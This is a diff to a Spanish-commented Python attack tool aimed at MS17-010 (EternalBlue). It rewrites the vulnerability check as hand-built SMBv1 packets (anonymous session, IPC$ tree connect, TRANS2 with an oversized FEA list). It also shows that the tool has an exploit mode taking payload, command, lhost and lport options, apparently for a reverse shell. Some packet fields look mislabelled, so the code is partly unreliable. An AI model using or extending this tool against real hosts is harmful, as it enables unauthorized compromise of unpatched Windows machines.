@@ -186,33 +186,127 @@ def _peek_named_pipe(sock, uid, tid):
 def check_ms17010(target, port=445, timeout=5):
     """
     Comprueba si el objetivo es vulnerable a MS17-010.
+    Usa el mismo método que el PoC original: TRANS2 SESSION_SETUP con FEA list oversized.
 
     Devuelve:
-      True   — vulnerable (SMBv1 activo y sin parche)
+      True   — vulnerable
       False  — parcheado o SMBv1 desactivado
       None   — no se pudo conectar / error
     """
     try:
-        sock, uid = _smb_connect(target, port, timeout)
-        tid = _tree_connect(sock, uid, target)
-        resp = _peek_named_pipe(sock, uid, tid)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((target, int(port)))
+
+        def recv(n):
+            d = b""
+            while len(d) < n:
+                c = sock.recv(n - len(d))
+                if not c:
+                    break
+                d += c
+            return d
+
+        # 1. Recibir NetBIOS session (4 bytes) + negociar protocolo
+        recv(4)
+        sock.send(NEGOTIATE_PROTOCOL_REQUEST)
+        length = struct.unpack(">I", recv(4))[0]
+        recv(length)
+
+        # 2. Session setup anónimo
+        sock.send(SESSION_SETUP_REQUEST)
+        length = struct.unpack(">I", recv(4))[0]
+        resp = recv(length)
+        # UID está en offset 32 del cuerpo SMB (sin el header NetBIOS de 4b)
+        uid = struct.unpack("<H", resp[32:34])[0]
+
+        # 3. Tree connect a IPC$
+        path = f"\\\\{target}\\IPC$".encode("utf-16-le") + b"\x00\x00"
+        # Construir paquete manualmente con offsets correctos
+        smb_hdr = (
+            b"\xff\x53\x4d\x42"   # magic
+            b"\x75"               # Tree Connect AndX
+            b"\x00\x00\x00\x00"  # NT status
+            b"\x18\x07\xc0\x00"  # flags
+            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        )
+        smb_hdr += struct.pack("<HH", 0xfffe, 0x0008)  # PID, MID
+        smb_hdr += struct.pack("<HH", uid, 0x0000)      # UID, TID (TID=0 en tree connect)
+
+        params = b"\x04\xff\x00\x00\x00\x00\x00\x01\x00"
+        byte_count = struct.pack("<H", len(path) + 1)  # +1 por el tipo de share
+        data = byte_count + b"\x00" + path  # \x00 = password vacío + path
+
+        body = smb_hdr + params + data
+        pkt = struct.pack(">I", len(body)) + body
+        sock.send(pkt)
+
+        length = struct.unpack(">I", recv(4))[0]
+        resp2 = recv(length)
+        tid = struct.unpack("<H", resp2[28:30])[0]
+
+        # 4. TRANS2 con FEA list — detecta el pool leak
+        # Construir paquete TRANS2 correcto con UID y TID reales
+        smb_hdr2 = (
+            b"\xff\x53\x4d\x42"   # magic
+            b"\x25"               # TRANS2
+            b"\x00\x00\x00\x00"  # NT status
+            b"\x18\x01\x28\x00"  # flags
+            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        )
+        smb_hdr2 += struct.pack("<HH", 0xfffe, 0x0008)
+        smb_hdr2 += struct.pack("<HH", uid, tid)
+
+        # Parámetros TRANS2 — subcommand 0x000e (SESSION_SETUP) con FEA oversized
+        trans_params = (
+            b"\x01\x00"          # TotalParameterCount
+            b"\x00\x00"          # TotalDataCount
+            b"\xff\xff"          # MaxParameterCount
+            b"\x00\x00"          # MaxDataCount
+            b"\x00"              # MaxSetupCount
+            b"\x00"              # Reserved
+            b"\x00\x00"          # Flags
+            b"\x00\x00\x00\x00" # Timeout
+            b"\x00\x00"          # Reserved2
+            b"\x01\x00"          # ParameterCount
+            b"\x4a\x00"          # ParameterOffset
+            b"\x00\x00"          # DataCount
+            b"\x4b\x00"          # DataOffset
+            b"\x01"              # SetupCount
+            b"\x00"              # Reserved3
+            b"\x0e\x00"          # Setup[0] = TRANS2_SESSION_SETUP
+        )
+
+        byte_count2 = struct.pack("<H", 12)
+        padding = b"\x00" * 3
+        fea_data = b"\x00" * 12  # FEA list mínimo
+
+        body2 = smb_hdr2 + trans_params + byte_count2 + padding + fea_data
+        pkt2 = struct.pack(">I", len(body2)) + body2
+        sock.send(pkt2)
+
+        hdr = recv(4)
+        if len(hdr) < 4:
+            sock.close()
+            return None
+        length = struct.unpack(">I", hdr)[0]
+        r = recv(length)
+
         sock.close()
 
-        if resp is None:
+        if len(r) < 13:
             return None
 
-        # NT_STATUS en bytes 9-12 de la respuesta SMB
-        nt_status = struct.unpack("<I", resp[9:13])[0] if len(resp) >= 13 else None
+        status = struct.unpack("<I", r[5:9])[0]
 
-        # 0xC0000205 = STATUS_INSUFF_SERVER_RESOURCES → vulnerable (fuga de pool)
-        # 0x00000000 = SUCCESS con parche aplicado → no vulnerable
-        # Otros errores: SMBv1 desactivado, firewall, etc.
-        if nt_status == 0xC0000205:
+        # STATUS_INSUFF_SERVER_RESOURCES = vulnerable
+        # STATUS_NOT_IMPLEMENTED o similares = sin SMBv1 / parcheado
+        if status == 0xC0000205:
             return True
-        elif nt_status == 0x00000000:
+        elif status in (0x00000000, 0xC0000034, 0xC00000BB):
             return False
         else:
-            # SMBv1 puede estar activo pero respuesta inesperada
+            # Cualquier otro error de SMB = no vulnerable o SMBv1 off
             return False
 
     except ConnectionRefusedError:
@@ -556,18 +650,16 @@ def main():
         parser.print_help()
         return
 
-    _banner()
-
+    # Banner solo en exploit, no en check (para que la salida sea limpia)
     if args.vuln == "ms17010":
-        if args.modo == "check":
-            run_check(args.target, args.port, args.timeout)
-        elif args.modo == "exploit":
-            run_exploit(
-                args.target, args.port,
-                args.payload, args.cmd,
-                args.lhost, args.lport,
-                args.timeout
-            )
+        if args.modo == "exploit":
+            _banner()
+        run_check(args.target, args.port, args.timeout) if args.modo == "check" else run_exploit(
+            args.target, args.port,
+            args.payload, args.cmd,
+            args.lhost, args.lport,
+            args.timeout
+        )
 
 
 if __name__ == "__main__":
